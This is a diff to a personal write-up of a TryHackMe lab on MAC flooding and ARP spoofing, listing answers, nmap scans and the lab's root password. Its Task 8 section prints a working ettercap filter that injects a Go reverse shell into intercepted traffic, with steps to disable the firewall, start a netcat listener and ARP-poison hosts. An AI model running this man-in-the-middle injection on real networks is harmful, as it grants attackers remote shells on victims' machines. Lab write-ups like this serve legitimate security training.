@@ -2,6 +2,9 @@
  <b> Tryhackme  L2 MAC Flooding &amp; ARP Spoofing writeup </b>
   
  <b> TASK 2 </b> <br>
+  <b> Note The admin user is in the sudo group. I suggest using the root user to complete this room <br>
+      sudo su (password : Layer2)</b><br>
+  
   Q.1    Now, can you (re)gain access? (Yay/Nay).<br>
   Ans.   Yea
   <br>
@@ -38,6 +41,8 @@
   Q. 2 Would you expect a different result when attacking hosts without ARP packet validation enabled? (Yay/Na<br>
   Ans. yay <br>
    <b> TASk 7</b> <br>
+    <b> Note : Use root user <br>
+       sudo su   (password : Layer2) </b><br>
    Q. 1 Scan the network on eth1. Who's there? Enter their IP addresses in ascending order. <br>
    <b>nmap 192.168.12.0/24</b><br>
    Ans. 192.168.12.10, 192.168.12.20 <br>
@@ -84,8 +89,30 @@
    <img src="last_q.png"><br>
    <b>TASK 8 </b> <br>
    Q. 1 What is the root.txt flag? <br>
-   Ans.   <br>
-      
+   Ans.  THM{........} <br>  
+    <b> Read carefully each and every line in Task 8 module L2 MAC Flooding & ARP Spoofing on tryhackme</b><br>
+    <b>Follow steps to find root flag</b><br>
+    hint: follow these steps on ssh machine not on your local machine<br>
+     step 1. copy and save in a whoami.ecf file  <br><br>
+     <b>if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
+    log(DATA.data, "/root/ettercap.log");
+    replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
+    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
+ } </b><br>
+ 
+ step 2. compile source code with etterfilter<br>
+  <b>etterfilter whoami.ecf -o whoami.ef</b><br>
+  step 3. Disable firewall <br>
+    <b>sudo ufw disable  (password: Layer2)</b><br>
+  step 4. open one another ssh session and start netcat listener<br>
+  <b>nc -nvlp 6666 & </b><br>
+  step 5. Run ettercap <br>
+  <b>sudo ettercap -T -i eth1 -M arp -F whoami.ef </b><br><br>
+  A few seconds after executing this command, you should see  "Connection received on 192.168.12.20 " on netcat listerer<br>
+  step 6. on netcat listener type "fg" to foreground listener<br>
+  
+  <img src=""><br>
+  
       
       
       
@@ -93,7 +120,8 @@
       
       Thank you <br>
       this is my first writeup, if i made any mistake foregive me.
-      if you have any questin connect with me on LinkedIn.(use tryhackme to get my LinkedIn Id)
+      if you have any questions connect with me on LinkedIn.(use tryhackme to get my LinkedIn Id).
+      
       
       Ajeet Kumar
    
